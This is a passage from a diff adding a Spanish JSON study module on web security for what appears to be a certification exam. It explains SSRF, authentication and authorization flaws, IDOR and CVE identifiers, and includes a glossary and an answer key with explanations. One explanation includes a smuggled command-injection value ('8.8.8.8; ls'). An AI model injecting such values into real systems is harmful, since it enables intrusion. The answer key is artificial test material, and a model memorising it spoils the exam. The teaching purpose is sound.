+          ["Quién hace la petición falsa", "El **navegador** de la víctima", "El **servidor** de la aplicación"],
+          ["Qué aprovecha", "Las cookies de sesión del usuario", "El acceso privilegiado del servidor a la red interna"],
+          ["Defensa principal", "Token anti-CSRF, SameSite", "Lista blanca de destinos y protocolos"]
+        ] },
+        { "type": "exam", "text": "La pregunta clave es **quién realiza la petición**: si es el servidor, es SSRF. «Una aplicación acepta una dirección y el servidor la consulta sin limitar el destino; el atacante accede a un servicio interno» = SSRF. Defensas trampa: validar **solo** el formato de la dirección, comprobar que termine en .jpg o confiar en el dominio tras una redirección. La buena: **restringir destinos y protocolos permitidos**." },
+        { "type": "key", "text": "En el SSRF el atacante usa al servidor como recadero para llegar a recursos internos que él no ve. Se previene con lista blanca de destinos y protocolos." }
+      ]
+    },
+    {
+      "id": "autenticacion-autorizacion",
+      "title": "Fallos de autenticación (CWE-287) y de autorización (CWE-863)",
+      "pages": [25, 29],
+      "blocks": [
+        { "type": "analogy", "text": "En un hotel, la **autenticación** es la recepción que comprueba tu DNI al llegar: «¿eres quien dices ser?». La **autorización** es la tarjeta de la habitación: aunque ya te hayan identificado, solo debe abrir **tu** habitación. Un hotel puede tener una recepción perfecta y tarjetas que abren cualquier puerta." },
+        { "type": "term", "term": "Autenticación", "text": "Verificar la **identidad**: comprobar que eres quien dices ser (contraseña, código en el móvil…)." },
+        { "type": "term", "term": "Autorización", "text": "Decidir **qué puede hacer** una identidad ya verificada: qué datos ver, qué acciones ejecutar." },
+        { "type": "p", "text": "**CWE-287, autenticación incorrecta (improper authentication)**: el sistema no verifica bien la identidad, y el atacante se hace pasar por un usuario legítimo, saltándose el inicio de sesión o quedándose con la cuenta de otro." },
+        { "type": "table", "title": "Fallos de autenticación: causa y remedio", "head": ["Causa", "Ejemplo", "Remedio"], "rows": [
+          ["Credenciales por defecto o «hardcodeadas» (escritas dentro del código)", "admin/admin que nadie cambia", "Validación estricta de credenciales; cambiar siempre las de fábrica"],
+          ["Contraseñas débiles o sin hash", "Contraseñas guardadas en texto plano", "Hash fuerte con salt aleatorio"],
+          ["Mecanismos débiles", "Solo contraseña; recuperación insegura", "MFA (autenticación multifactor)"],
+          ["Validación de sesión incompleta", "Reutilizar un token de sesión robado", "Tokens aleatorios, de corta duración y verificados en cada petición"],
+          ["Bypass de autenticación", "Cambiar un parámetro de la URL o una cookie para saltarse el login", "Verificar la identidad en cada punto de acceso"]
+        ] },
+        { "type": "term", "term": "Hash y salt", "text": "Un hash es una «huella» de la contraseña que no se puede deshacer; se guarda la huella, no la contraseña. El salt es un valor aleatorio que se añade antes de calcular la huella, para que dos contraseñas iguales no den la misma huella." },
+        { "type": "term", "term": "MFA (Multi-Factor Authentication, autenticación multifactor)", "text": "Pedir una segunda prueba además de la contraseña, por ejemplo un código enviado al teléfono. Reduce mucho el riesgo aunque roben la contraseña." },
+        { "type": "p", "text": "**CWE-863, autorización incorrecta (incorrect authorization)**: la aplicación concede a un usuario o proceso **permisos que no debería tener** porque no comprueba bien si puede hacer lo que pide. Puede ir desde ver datos privados ajenos hasta tomar el control de la aplicación." },
+        { "type": "list", "title": "Ejemplos de fallos de autorización", "items": [
+          "**Omisión del control de acceso**: una función eliminar_usuario no comprueba si quien la llama es administrador.",
+          "**IDOR (Insecure Direct Object Reference, referencia directa insegura a objetos)**: cambiar perfil?id=123 por perfil?id=124 y ver el perfil de otro. El usuario está autenticado, pero nadie comprueba que **ese objeto** sea suyo.",
+          "**Control de acceso fallido en las API**: una API (Application Programming Interface, interfaz para que los programas se comuniquen) tiene puntos de acceso que exigen permisos, pero no los valida."
+        ] },
+        { "type": "list", "title": "Mitigación", "items": [
+          "**Controles de acceso en el código**: cada función o punto de acceso con datos sensibles comprueba los permisos (los **roles**) del usuario antes de actuar.",
+          "**Mínimo privilegio centralizado** y **identificadores no predecibles**."
+        ] },
+        { "type": "example", "title": "La factura del vecino", "text": "Lucía consulta su factura en mifactura?num=5001. Cambia el número a 5002 y ve la factura de otro cliente. Estar autenticada no basta: el servidor debía comprobar que **Lucía tiene permiso sobre la factura 5002**. Que el número sea un entero válido o que la factura exista no resuelve nada." },
+        { "type": "exam", "text": "«Acceder a recursos ajenos **cambiando un identificador**» = **falta de comprobación de autorización sobre el objeto** (IDOR), no falta de autenticación ni de cifrado. Lo que debe comprobar el servidor es **que el usuario tenga permiso sobre ese objeto**; validar el formato del número, que exista una sesión cualquiera o que el objeto exista son trampas." },
+        { "type": "key", "text": "Autenticación = quién eres; autorización = qué puedes hacer. Un usuario bien autenticado puede seguir accediendo a lo ajeno si el servidor no comprueba permisos sobre cada objeto." }
+      ]
+    },
+    {
+      "id": "cve",
+      "title": "Software no actualizado y CVE: el nombre propio de cada vulnerabilidad",
+      "pages": [29, 37],
+      "blocks": [
+        { "type": "p", "text": "Una de las formas más simples de ser atacado es usar **software sin actualizar**: las vulnerabilidades ya conocidas tienen nombre, explicación pública y, a menudo, herramientas para explotarlas. Para poder hablar de ellas sin confusiones existe CVE." },
+        { "type": "term", "term": "CVE (Common Vulnerabilities and Exposures, vulnerabilidades y exposiciones comunes)", "text": "Diccionario o **sistema de identificación estandarizado** que asigna un **nombre único** a cada vulnerabilidad de seguridad descubierta. No es una base de datos de vulnerabilidades en sí, sino un **sistema de nomenclatura**: un índice para que todos hablen el mismo idioma." },
+        { "type": "analogy", "text": "Es como la matrícula de un coche: no te dice si el coche está bien o mal ni si ha tenido un accidente, pero permite que la policía, el taller y la aseguradora hablen del mismo coche sin equivocarse." },
+        { "type": "table", "title": "Cómo se lee CVE-AAAA-NNNNN", "head": ["Parte", "Significado"], "rows": [
+          ["CVE", "Prefijo fijo"],
+          ["AAAA", "Año en que se hizo pública la vulnerabilidad"],
+          ["NNNNN", "Número de secuencia único para esa vulnerabilidad en ese año"]
+        ] },
+        { "type": "example", "title": "Log4j", "text": "CVE-2021-44228 es la famosa vulnerabilidad de Log4j, una librería de registro muy usada en programas Java. Gracias al identificador, un equipo de seguridad puede buscar en todos sus sistemas «¿tenemos CVE-2021-44228?» y aplicar el parche correspondiente." },
+        { "type": "list", "title": "Para qué sirve", "items": [
+          "**Coordinación**: saber que hablamos de la misma vulnerabilidad que un informe externo.",
+          "**Gestión de parches**: buscar en los sistemas los CVE presentes y aplicar las correcciones.",
+          "**Investigación**: estudiar vulnerabilidades concretas con un nombre único."
+        ] },
+        { "type": "p", "text": "Lo mantiene la **MITRE Corporation**, con el patrocinio del Departamento de Seguridad Nacional de EE. UU. MITRE asigna y cataloga los identificadores, pero las vulnerabilidades las descubren y comunican investigadores, desarrolladores y la comunidad. Cada CVE asignado se enlaza con detalles técnicos, soluciones y avisos." },
+        { "type": "list", "title": "Lecturas «A fondo» del tema", "items": [
+          "**Protocolo HTTP**: guía de Mozilla sobre cómo funciona HTTP.",
+          "**CCN-CERT BP/07**: buenas prácticas del Centro Criptológico Nacional para implantar HTTPS (HTTP cifrado) en webs públicas e internas.",
+          "**CWE Top 25**: la lista oficial de las 25 debilidades más peligrosas.",
+          "**OWASP VWAD (Vulnerable Web Applications Directory)**: directorio de aplicaciones web y móviles **vulnerables a propósito** para practicar ataques y defensas en un entorno legal.",
+          "**OWASP Top 10 API Security Risks (2023)**: los diez riesgos principales de las API, pensado para educar a quienes las desarrollan y mantienen."
+        ] },
+        { "type": "exam", "text": "Un CVE sirve para **referenciar de forma estandarizada una vulnerabilidad conocida**. Trampas: no clasifica la gravedad automáticamente, no demuestra que el fallo se haya explotado y no certifica que haya un parche aplicado." },
+        { "type": "key", "text": "CVE es la «matrícula» de cada vulnerabilidad (CVE-año-número), mantenida por MITRE, para que todos hablen de la misma sin ambigüedad." }
+      ]
+    }
+  ],
+  "summary": [
+    "OWASP Top Ten y CWE Top 25 recogen los fallos más frecuentes y peligrosos; CWE cataloga tipos de debilidad y CVE nombra vulnerabilidades concretas.",
+    "La raíz común de casi todo: datos del usuario sin validar que otro programa acaba interpretando como órdenes.",
+    "Inyección SQL: la entrada se mezcla con la consulta; la defensa más eficaz son las consultas parametrizadas.",
+    "XSS: el script se ejecuta en el navegador de la víctima; el almacenado afecta a todos los visitantes, el reflejado a quien pulsa el enlace y el DOM ocurre solo en el cliente. Defensas: validar, codificar la salida y CSP.",
+    "Inyección de comandos: la entrada acaba en una orden del sistema operativo; evita comandos, usa lista blanca y mínimo privilegio.",
+    "HTTP response splitting: \\r\\n en una cabecera parte la respuesta en dos y permite inyectar cookies, HTML y JavaScript.",
+    "LFI/path traversal lee archivos locales con ../; RFI incluye y ejecuta un archivo remoto del atacante (RCE).",
+    "CSRF: el navegador autenticado envía una petición no deseada con sus cookies; se frena con un token impredecible y SameSite.",
+    "SSRF: el servidor hace peticiones a destinos elegidos por el atacante; se frena con lista blanca de destinos y protocolos.",
+    "Autenticación es quién eres; autorización, qué puedes hacer. IDOR: cambiar un identificador y ver lo ajeno porque no se comprueban permisos sobre el objeto.",
+    "CVE-AAAA-NNNNN identifica una vulnerabilidad pública; lo mantiene MITRE."
+  ],
+  "glossary": [
+    { "term": "OWASP (Open Worldwide Application Security Project)", "text": "Comunidad abierta de seguridad de aplicaciones, autora del OWASP Top Ten." },
+    { "term": "CWE (Common Weakness Enumeration)", "text": "Catálogo de tipos de debilidad del software, mantenido por MITRE." },
+    { "term": "CVE (Common Vulnerabilities and Exposures)", "text": "Identificador único y estandarizado de una vulnerabilidad concreta: CVE-año-número." },
+    { "term": "SDLC (Software Development Life Cycle)", "text": "Ciclo de vida del desarrollo del software, desde el diseño hasta el mantenimiento." },
+    { "term": "HTTP (HyperText Transfer Protocol)", "text": "Protocolo con el que navegador y servidor intercambian peticiones y respuestas." },
+    { "term": "SQL (Structured Query Language)", "text": "Lenguaje para consultar y modificar bases de datos." },
+    { "term": "SQLI (SQL injection)", "text": "Inyección de instrucciones SQL a través de la entrada del usuario." },
+    { "term": "Consulta parametrizada (prepared statement)", "text": "Consulta con plantilla fija y huecos que se rellenan con datos, sin que estos puedan cambiar su estructura." },
+    { "term": "XSS (Cross-Site Scripting)", "text": "Inyección de scripts en una página que se ejecutan en el navegador de otros usuarios." },
+    { "term": "DOM (Document Object Model)", "text": "Representación de la página en el navegador que JavaScript puede modificar." },
+    { "term": "CSP (Content Security Policy)", "text": "Cabecera de seguridad que restringe qué recursos y scripts puede cargar una página." },
+    { "term": "Inyección de comandos (OS command injection)", "text": "Ejecución de órdenes arbitrarias del sistema operativo a través de la aplicación." },
+    { "term": "CR LF (\\r\\n)", "text": "Retorno de carro y salto de línea: los caracteres que separan las líneas de una cabecera HTTP." },
+    { "term": "HTTP response splitting", "text": "Inyección de CR LF en cabeceras para partir una respuesta en dos." },
+    { "term": "CDN (Content Delivery Network)", "text": "Red de servidores que guarda copias del contenido para servirlo más rápido; puede envenenarse." },
+    { "term": "LFI (Local File Inclusion) / path traversal", "text": "Acceso a archivos locales del servidor manipulando la ruta, normalmente con ../." },
+    { "term": "RFI (Remote File Inclusion)", "text": "Inclusión y ejecución de un archivo alojado en un servidor externo del atacante." },
+    { "term": "RCE (Remote Code Execution)", "text": "Ejecución de código del atacante en una máquina ajena a distancia." },
+    { "term": "allow_url_include", "text": "Directiva de php.ini que permite incluir archivos desde URL remotas; debe desactivarse." },
+    { "term": "CSRF (Cross-Site Request Forgery)", "text": "Hacer que el navegador autenticado de la víctima envíe una petición no deseada." },
+    { "term": "Token anti-CSRF", "text": "Valor único, secreto e impredecible por sesión que el servidor exige en cada formulario." },
+    { "term": "SameSite", "text": "Atributo de las cookies que limita su envío en peticiones procedentes de otros sitios." },
+    { "term": "SSRF (Server-Side Request Forgery)", "text": "Hacer que el servidor realice peticiones a destinos elegidos por el atacante." },
+    { "term": "URL (Uniform Resource Locator)", "text": "Dirección de un recurso en la web." },
+    { "term": "MFA (Multi-Factor Authentication)", "text": "Autenticación que exige más de una prueba de identidad." },
+    { "term": "Hash y salt", "text": "Huella irreversible de una contraseña y valor aleatorio que se le añade antes de calcularla." },
+    { "term": "IDOR (Insecure Direct Object Reference)", "text": "Fallo de autorización: acceder a objetos ajenos cambiando su identificador." },
+    { "term": "API (Application Programming Interface)", "text": "Interfaz que permite que los programas se comuniquen entre sí." },
+    { "term": "DoS (Denial of Service)", "text": "Ataque que deja un servicio sin funcionar." },
+    { "term": "Mínimo privilegio", "text": "Dar a cada cuenta o proceso solo los permisos imprescindibles para limitar el daño." },
+    { "term": "Lista blanca (whitelisting)", "text": "Aceptar solo valores conocidos y permitidos, en lugar de intentar bloquear los malos." }
+  ],
+  "questions": {
+    "sistemas-t03-01": {
+      "section": "xss",
+      "reasoning": "Hay dos pistas: el código se inyecta en una página web y lo ejecutan otros usuarios en su navegador. El ataque cuya víctima es el usuario y cuyo código corre en el navegador es el XSS. Ninguna de las otras opciones ejecuta código en el navegador de terceros.",
+      "options": {
+        "a": "Incorrecta. La inyección SQL ataca la base de datos del servidor, no el navegador de otros usuarios.",
+        "b": "Incorrecta. La RFI hace que el servidor incluya y ejecute un archivo remoto; el código corre en el servidor.",
+        "c": "Incorrecta. El CSRF fuerza al navegador a enviar una petición, pero no inyecta código en la página.",
+        "d": "Correcta. El XSS inyecta scripts en una página que luego se ejecutan en el navegador de quienes la visitan."
+      }
+    },
+    "sistemas-t03-02": {
+      "section": "comandos",
+      "reasoning": "Ejecutar comandos arbitrarios en el sistema operativo del servidor es la definición literal de la inyección de comandos (CWE-78): la entrada del usuario acaba formando parte de una orden del sistema.",
+      "options": {
+        "a": "Incorrecta. La exposición de datos sensibles es una consecuencia posible, no el nombre de la vulnerabilidad que ejecuta comandos.",
+        "b": "Incorrecta. El control de acceso roto trata de permisos mal comprobados, no de ejecutar órdenes del sistema.",
+        "c": "Correcta. La inyección de comandos permite ejecutar comandos arbitrarios en el sistema operativo a través de la aplicación.",
+        "d": "Incorrecta. En el SSRF el servidor hace peticiones HTTP a destinos elegidos por el atacante, no ejecuta comandos del sistema."
+      }
+    },
+    "sistemas-t03-03": {
+      "section": "xss",
+      "reasoning": "El XSS almacenado guarda el script en la base de datos (un comentario, un perfil), así que se ejecuta a todo el que visite la página. El reflejado no se guarda: viaja en un enlace o formulario y solo alcanza a quien cae en esa trampa concreta. La diferencia principal es, por tanto, el alcance: una víctima frente a todos los visitantes.",
+      "options": {
+        "a": "Incorrecta. Es al revés: el que usa la base de datos es el almacenado; el reflejado no se guarda.",
+        "b": "Incorrecta. Ambos tienen como objetivo al usuario y se ejecutan en su navegador.",
+        "c": "Incorrecta. Es al revés: el reflejado requiere que la víctima pulse un enlace; el almacenado se ejecuta solo con visitar la página.",
+        "d": "Correcta. El reflejado afecta a quien pulsa el enlace manipulado; el almacenado puede afectar a todos los que acceden a la página."
+      }
+    },
+    "sistemas-t03-04": {
+      "section": "csrf",
+      "reasoning": "En el CSRF el usuario ya tiene sesión abierta y su navegador envía las cookies automáticamente. El atacante aprovecha esa confianza para que el navegador mande una petición que el usuario no quería, como una transferencia. No roba nada ni inyecta código.",
+      "options": {
+        "a": "Correcta. El CSRF fuerza al navegador del usuario autenticado a realizar una solicitud no deseada.",
+        "b": "Incorrecta. Acceder a la base de datos es propio de la inyección SQL.",
+        "c": "Incorrecta. Inyectar código en la página es propio del XSS.",
+        "d": "Incorrecta. El CSRF no roba las cookies: aprovecha que el navegador ya las tiene y las envía solo. Robarlas sería típico del XSS."
+      }
+    },
+    "sistemas-t03-05": {
+      "section": "sqli",
+      "reasoning": "Si el atacante explota cómo la aplicación construye las consultas a su base de datos, está colando SQL en esas consultas: es una inyección SQL (CWE-89).",
+      "options": {
+        "a": "Incorrecta. La inyección de comandos afecta a órdenes del sistema operativo, no a consultas de base de datos.",
+        "b": "Correcta. La inyección SQL manipula las consultas que la aplicación envía a la base de datos.",
+        "c": "Incorrecta. El XSS ejecuta scripts en el navegador de los usuarios.",
+        "d": "Incorrecta. El CSRF provoca peticiones no deseadas desde el navegador autenticado."
+      }
+    },
+    "sistemas-t03-06": {
+      "section": "raiz-comun",
+      "reasoning": "Cuando la aplicación no valida la entrada, ese texto puede acabar interpretado como código por la base de datos (SQLi), por el sistema operativo (comandos) o por el navegador (XSS). Por eso la falta de validación es causa común de las inyecciones de código y del XSS. El CSRF, en cambio, no depende de la entrada, sino de que el navegador envía las cookies solo.",
+      "options": {
+        "a": "Incorrecta. La exposición de datos puede ser una consecuencia, pero no es la familia de ataques que el tema asocia directamente a la falta de validación.",
+        "b": "Incorrecta. El CSRF no se debe a la falta de validación de entradas, sino a la confianza en el navegador autenticado; se frena con tokens.",
+        "c": "Incorrecta. La palabra «solo» la invalida: la falta de validación provoca muchas más inyecciones que las de comandos.",
+        "d": "Correcta. Inyecciones de código y XSS comparten esa causa: datos sin validar interpretados como código."
+      }
+    },
+    "sistemas-t03-07": {
+      "section": "ssrf",
+      "reasoning": "La aplicación recibe una dirección y es el servidor quien la consulta sin limitar el destino; así el atacante llega a un servicio interno que él no ve. Que la petición la haga el servidor por encargo del atacante es la definición de SSRF.",
+      "options": {
+        "a": "Correcta. En el SSRF el atacante obliga al servidor a hacer peticiones a destinos internos que elige él.",
+        "b": "Incorrecta. La inyección SQL manipula consultas a la base de datos, no hace que el servidor visite direcciones.",
+        "c": "Incorrecta. El XSS se ejecuta en el navegador de la víctima, no hace que el servidor consulte direcciones.",
+        "d": "Incorrecta. Un ataque de fuerza bruta prueba muchas contraseñas; no tiene que ver con peticiones del servidor."
+      }
+    },
+    "sistemas-t03-08": {
+      "section": "sqli",
+      "reasoning": "La inyección SQL nace de mezclar datos y estructura de la consulta. Las consultas parametrizadas los separan, así que la entrada siempre se trata como dato. El temario las califica como el método más efectivo; las demás medidas son complementarias o no atacan la causa.",
+      "options": {
+        "a": "Incorrecta. La lista blanca ayuda como validación, pero no es la medida más efectiva según el tema.",
+        "b": "Incorrecta. Cifrar la base de datos no impide que una consulta manipulada se ejecute.",
+        "c": "Correcta. Las consultas parametrizadas son el método más efectivo porque separan la estructura de los datos.",
+        "d": "Incorrecta. Filtrar un carácter concreto es una protección parcial que se puede eludir."
+      }
+    },
+    "sistemas-t03-09": {
+      "section": "lfi",
+      "reasoning": "Acceder a recursos locales del servidor manipulando la ruta, normalmente con ../, es el path traversal (LFI, CWE-22). La clave está en «locales»: si el archivo viniera de fuera sería RFI.",
+      "options": {
+        "a": "Correcta. El path traversal permite salir de la carpeta permitida y leer archivos locales del servidor.",
+        "b": "Incorrecta. Describe un problema de exposición por peticiones de otros dominios a una API, no el acceso a archivos locales.",
+        "c": "Incorrecta. La inyección SQL ataca la base de datos, no el sistema de archivos.",
+        "d": "Incorrecta. La RFI incluye archivos remotos, alojados fuera del servidor."
+      }
+    },
+    "sistemas-t03-10": {
+      "section": "response-splitting",
+      "reasoning": "Al inyectar \\r\\n en una cabecera, el atacante crea una segunda respuesta que controla por completo, incluido su cuerpo. Ahí puede meter HTML o JavaScript (un XSS). La inyección SQL no aparece porque no hay ninguna consulta a la base de datos. Por eso son correctas la B y la D.",
+      "options": {
+        "a": "Correcta. La división de respuesta permite inyectar tanto JavaScript (B) como HTML (D) en la respuesta falsificada.",
+        "b": "Incorrecta como respuesta única. Es cierto, pero incompleto: también se puede inyectar HTML, y la opción a recoge ambas.",
+        "c": "Incorrecta. La inyección SQL es un problema distinto, en la construcción de consultas a la base de datos.",
+        "d": "Incorrecta como respuesta única. Es cierto, pero incompleto: también se puede inyectar JavaScript, y la opción a recoge ambas."
+      }
+    },
+    "sistemas-t03-11": {
+      "section": "sqli",
+      "reasoning": "La inyección SQL ocurre porque la aplicación, en lugar de tratar la entrada como dato, la trata como parte de la consulta. La causa es, por tanto, tratar las entradas del usuario como instrucciones de consulta.",
+      "options": {
+        "a": "Incorrecta. Tratar las entradas como parámetros separados es la defensa, no la causa.",
+        "b": "Correcta. La inyección surge cuando la entrada del usuario se interpreta como parte de la consulta SQL.",
+        "c": "Incorrecta. Codificar caracteres antes de mostrarlos es una defensa contra el XSS.",
+        "d": "Incorrecta. Validar permisos sobre un objeto tiene que ver con la autorización, no con la inyección SQL."
+      }
+    },
+    "sistemas-t03-12": {
+      "section": "xss",
+      "reasoning": "En el XSS el objetivo no es el servidor, sino los usuarios: el script llega dentro de la página y lo ejecuta el navegador de la víctima.",
+      "options": {
+        "a": "Correcta. El código del XSS se ejecuta en el navegador de la víctima.",
+        "b": "Incorrecta. Ejecutar órdenes en el sistema operativo del servidor es la inyección de comandos.",
+        "c": "Incorrecta. Ejecutarse como consulta en el motor de base de datos es la inyección SQL.",
+        "d": "Incorrecta. Manipular cabeceras que interpreta un proxy se acerca a HTTP response splitting, no al XSS."
+      }
+    },
+    "sistemas-t03-13": {
+      "section": "xss",
+      "reasoning": "«Código almacenado» es el XSS persistente: el script se guarda en la aplicación (en la base de datos, por ejemplo en un comentario) y se ejecuta a cada usuario que visite después la página.",
+      "options": {
+        "a": "Incorrecta. Que el código solo viaje en una petición manipulada describe el XSS reflejado.",
+        "b": "Incorrecta. Reflejarse sin conservarse es justo lo contrario de almacenado.",
+        "c": "Incorrecta. El navegador no lo ejecuta desde el disco del atacante, sino desde la página de la aplicación vulnerable.",
+        "d": "Correcta. El contenido malicioso queda guardado y afecta a las visitas posteriores."
+      }
+    },
+    "sistemas-t03-14": {
+      "section": "comandos",
+      "reasoning": "Si la aplicación pega la entrada del usuario en un comando del sistema, el atacante puede añadir órdenes (por ejemplo, 8.8.8.8; ls). La inyección de comandos permite, por tanto, ejecutar órdenes no previstas.",
+      "options": {
+        "a": "Incorrecta. Modificar una consulta de base de datos es la inyección SQL.",
+        "b": "Incorrecta. Forzar al navegador de la víctima a enviar una petición es el CSRF.",
+        "c": "Correcta. La inyección de comandos ejecuta órdenes del sistema no previstas a partir de entradas manipuladas.",
+        "d": "Incorrecta. Insertar cabeceras adicionales en una respuesta es HTTP response splitting."
+      }
+    },
+    "sistemas-t03-15": {
+      "section": "csrf",
+      "reasoning": "El CSRF no roba credenciales: aprovecha que el navegador, al enviar cualquier petición al banco, añade automáticamente las cookies de la sesión activa. El servidor la cree legítima.",
+      "options": {
+        "a": "Incorrecta. Ejecutar código almacenado en el navegador describe el XSS persistente.",
+        "b": "Correcta. El CSRF aprovecha que el navegador envía la petición con las credenciales de una sesión activa.",
+        "c": "Incorrecta. En el CSRF el atacante no tiene la contraseña ni accede directamente.",
+        "d": "Incorrecta. Que el propio servidor se conecte a destinos internos es el SSRF."
+      }
+    },
+    "sistemas-t03-16": {
+      "section": "ssrf",
+      "reasoning": "En el SSRF el atacante elige el destino, pero quien hace la petición es el propio servidor de la aplicación, que tiene acceso a la red interna.",
+      "options": {
+        "a": "Correcta. En el SSRF la petición inducida la realiza el servidor de la aplicación.",
+        "b": "Incorrecta. Que la petición la haga el navegador autenticado de la víctima es el CSRF.",
+        "c": "Incorrecta. El motor de base de datos interpretando una consulta corresponde a la inyección SQL.",
+        "d": "Incorrecta. Incluir una ruta local corresponde a LFI o path traversal."
+      }
+    },
+    "sistemas-t03-17": {
+      "section": "sqli",
+      "reasoning": "Una consulta parametrizada envía al motor primero la plantilla (la estructura) y después los valores por separado. Como la estructura ya está fijada, lo que escriba el usuario se trata siempre como dato.",
+      "options": {
+        "a": "Incorrecta. No se trata de ocultar la consulta: lo que cambia es precisamente cómo se interpretan las entradas.",
+        "b": "Incorrecta. Las consultas parametrizadas no conceden permisos; al contrario, se combinan con el mínimo privilegio.",
+        "c": "Incorrecta. No sustituyen la comprobación de permisos, que es un control distinto.",
+        "d": "Correcta. Separan la estructura de la consulta de los valores, que nunca pueden cambiarla."
+      }
+    },
+    "sistemas-t03-18": {
+      "section": "xss",
+      "reasoning": "CSP es una cabecera de seguridad con la que el administrador indica qué recursos (scripts, hojas de estilo…) puede cargar la página. Así un script inyectado no autorizado no se ejecuta: es una defensa extra contra el XSS.",
+      "options": {
+        "a": "Incorrecta. Las consultas por parámetros son la defensa contra la inyección SQL, no la CSP.",
+        "b": "Incorrecta. Comprobar la pertenencia de objetos al usuario es un control de autorización.",
+        "c": "Correcta. CSP restringe qué recursos y scripts puede cargar una página.",
+        "d": "Incorrecta. CSP no autentica al cliente ni usa certificados."
+      }
+    },
+    "sistemas-t03-19": {
+      "section": "response-splitting",
+      "reasoning": "Las líneas de una respuesta HTTP se separan con retorno de carro (\\r) y salto de línea (\\n). Si el atacante los cuela en una cabecera, termina la cabecera actual y empieza otra o una respuesta nueva: así nace la división de respuestas.",
+      "options": {
+        "a": "Incorrecta. La secuencia ../ en una ruta se usa en el path traversal.",
+        "b": "Correcta. Los caracteres de retorno de carro y salto de línea en las cabeceras originan la división de la respuesta.",
+        "c": "Incorrecta. Las comillas que alteran una consulta son propias de la inyección SQL.",
+        "d": "Incorrecta. Las etiquetas script en el cuerpo de una página son propias del XSS."
+      }
+    },
+    "sistemas-t03-20": {
+      "section": "lfi",
+      "reasoning": "Para que el usuario no decida qué archivo se incluye, el temario recomienda una lista blanca de nombres permitidos o un índice que asocie el parámetro a un archivo seguro. Las demás opciones son controles débiles que un atacante puede eludir.",
+      "options": {
+        "a": "Correcta. Una lista permitida de archivos o identificadores válidos impide incluir archivos arbitrarios.",
+        "b": "Incorrecta. Comprobar solo la extensión no impide usar ../ para salir de la carpeta permitida.",
+        "c": "Incorrecta. Que la petición venga de un formulario interno no garantiza nada: el atacante puede manipular el parámetro.",
+        "d": "Incorrecta. Cambiar el nombre del parámetro no cambia que su valor siga sin validarse."
+      }
+    },
+    "sistemas-t03-21": {
+      "section": "rfi",
+      "reasoning": "En la RFI el archivo incluido está en un servidor del atacante, que controla su contenido. El servidor víctima lo ejecuta como propio, por eso el riesgo más grave es la ejecución remota de código.",
+      "options": {
+        "a": "Incorrecta. Leer una ruta local sin recurso externo describe LFI, no RFI.",
+        "b": "Incorrecta. Falsificar una petición del navegador autenticado es el CSRF.",
+        "c": "Incorrecta. La escucha pasiva de datos en tránsito es un ataque de red, ajeno a la RFI.",
+        "d": "Correcta. La RFI permite ejecutar código alojado en un servidor bajo control del atacante."
+      }
+    },
+    "sistemas-t03-22": {
+      "section": "autenticacion-autorizacion",
+      "reasoning": "Si basta con cambiar perfil?id=123 por 124 para ver datos ajenos, el usuario ya está autenticado: lo que falla es que el servidor no comprueba si tiene permiso sobre ese objeto. Es un IDOR, un tipo de fallo de autorización.",
+      "options": {
+        "a": "Incorrecta. El usuario sí está autenticado; además, «únicamente» descarta la opción.",
+        "b": "Incorrecta. El cifrado del canal protege los datos en tránsito, no decide quién puede ver qué.",
+        "c": "Correcta. Falta la comprobación de autorización sobre el objeto solicitado (IDOR).",
+        "d": "Incorrecta. Aquí no se inyecta nada: solo se cambia un número válido."
+      }
+    },
+    "sistemas-t03-23": {
+      "section": "cve",
+      "reasoning": "CVE es un sistema de nomenclatura: da un nombre único (CVE-año-número) a cada vulnerabilidad conocida para que todos se refieran a ella sin ambigüedad.",
+      "options": {
+        "a": "Incorrecta. El identificador CVE no clasifica la gravedad automáticamente.",
+        "b": "Correcta. Sirve para referenciar de forma estandarizada una vulnerabilidad conocida.",
+        "c": "Incorrecta. Tener un CVE no demuestra que la vulnerabilidad se haya explotado.",
+        "d": "Incorrecta. Un CVE no certifica que se haya aplicado un parche; solo nombra el problema."
+      }
+    },
+    "sistemas-t03-24": {
+      "section": "sqli",
+      "reasoning": "La causa es concatenar el nombre de usuario dentro de la consulta, mezclando datos y estructura. Lo único que ataca esa causa es separarlos con consultas parametrizadas.",
+      "options": {
+        "a": "Correcta. Las consultas parametrizadas eliminan la concatenación y separan datos de estructura.",
+        "b": "Incorrecta. La validación en el navegador se puede saltar enviando la petición directamente al servidor.",
+        "c": "Incorrecta. Cambiar a POST no cambia cómo se construye la consulta.",
+        "d": "Incorrecta. Ocultar los errores dificulta la inyección basada en errores, pero la consulta sigue siendo vulnerable (por ejemplo, a la ciega)."
+      }
+    },
+    "sistemas-t03-25": {
+      "section": "xss",
+      "reasoning": "El comentario queda guardado en la aplicación y se ejecuta en el navegador de cada lector posterior: es código de navegador almacenado, es decir, XSS persistente.",
+      "options": {
+        "a": "Incorrecta. El código reflejado en una única solicitud no afecta a todos los lectores posteriores.",
+        "b": "Incorrecta. La RFI ejecuta un archivo remoto en el servidor, no en el navegador de los lectores.",
+        "c": "Incorrecta. El CSRF falsifica peticiones, pero aquí sí se ejecuta código.",
+        "d": "Correcta. Es un XSS almacenado: el código persiste y se ejecuta a cada visitante."
+      }
+    },
+    "sistemas-t03-26": {
+      "section": "csrf",
+      "reasoning": "El banco tiene que distinguir un formulario enviado de verdad desde su sesión de uno forzado por otra web. El token anti-CSRF, único e impredecible por sesión, lo consigue: el atacante no lo conoce y su petición se rechaza.",
+      "options": {
+        "a": "Incorrecta. El identificador de sesión es lo que el navegador envía solo; es justo lo que aprovecha el CSRF.",
+        "b": "Incorrecta. Un valor fijo y compartido lo podría conocer el atacante; el token debe ser único e impredecible.",
+        "c": "Correcta. Un token impredecible contra la falsificación de peticiones demuestra que el formulario procede de la sesión esperada.",
+        "d": "Incorrecta. Usar solo POST no impide que otra web envíe un formulario POST al banco."
+      }
+    },
+    "sistemas-t03-27": {
+      "section": "ssrf",
+      "reasoning": "Un servicio que descarga imágenes desde una dirección del usuario es el ejemplo clásico de SSRF. La defensa del temario es una lista blanca de dominios y protocolos permitidos, para que el servidor no visite direcciones internas ni use file://.",
+      "options": {
+        "a": "Incorrecta. Una dirección interna como http://192.168.1.1/admin tiene un formato perfectamente correcto.",
+        "b": "Correcta. Restringir destinos y protocolos permitidos impide las peticiones a servicios internos.",
+        "c": "Incorrecta. Que termine en .jpg no impide que apunte a un servidor interno.",
+        "d": "Incorrecta. Una redirección puede llevar después a un destino interno; hay que controlar el destino real."
+      }
+    },
+    "sistemas-t03-28": {
+      "section": "autenticacion-autorizacion",
